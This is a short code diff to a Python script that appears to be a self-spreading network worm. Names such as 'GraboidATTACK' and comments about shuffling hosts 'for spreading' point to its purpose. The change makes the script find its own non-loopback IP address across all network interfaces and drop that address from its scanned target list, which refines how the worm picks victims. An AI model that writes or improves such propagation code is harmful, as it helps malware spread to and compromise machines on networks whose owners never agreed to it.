@@ -128,9 +128,18 @@ def GraboidATTACK(host):
 
 
 def thisIP(interface):
-  ip_addr = netifaces.ifaddresses(interface)[2][0]['addr']
+  # ip_addr = netifaces.ifaddresses(interface)[2][0]['addr']
   
-  return ip_addr if not ip_addr == "127.0.0.1" else None
+  # return ip_addr if not ip_addr == "127.0.0.1" else None
+  networkInter = netifaces.interfaces()
+  ip_addr = None
+  for net in networkInter:
+    addr = netifaces.ifaddresses(net)[2][0]['addr']
+    if not addr == "127.0.0.1":
+      ip_addr = addr
+      break
+
+  return ip_addr
 
 #find_file
 def TGT_file(fname):
@@ -174,7 +183,7 @@ def main():
     networkHosts = scanner()
     print(networkHosts)
 
-    # networkHosts.remove()
+    networkHosts.remove(ip_addr)
     
     #suffle hosts for spreading
     random.shuffle(networkHosts)
